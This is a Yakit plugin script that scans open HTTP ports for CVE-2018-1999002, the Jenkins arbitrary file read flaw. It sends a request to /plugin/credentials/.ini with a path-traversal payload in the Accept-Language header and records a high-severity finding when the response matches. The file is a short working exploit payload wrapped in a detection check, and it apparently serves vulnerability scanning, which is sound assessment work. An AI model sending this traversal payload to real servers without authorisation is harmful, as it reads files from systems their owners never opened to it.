# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `GET /plugin/credentials/.ini HTTP/1.1
Host: {{params(target)}}
Accept-Language: ../../../../../../../../../../../../windows/win
Connection: close
Upgrade-Insecure-Requests: 1
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        
        if str.MatchAllOfSubString(rsp, "200")&&str.MatchAllOfSubString(rsp, "16bit"){
            yakit.Info("%v found CVE-2018-1999002 Jenkins 任意文件读取 ", addr)
            risk.NewRisk(
            addr,risk.title("CVE-2018-1999002"),
            risk.severity("high"),
            risk.titleVerbose("CVE-2018-1999002 Jenkins 任意文件读取"),
            risk.type("任意文件读取"),
            risk.payload(`Accept-Language: ../../../../../../../../../../../../windows/win`),
        )
        }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
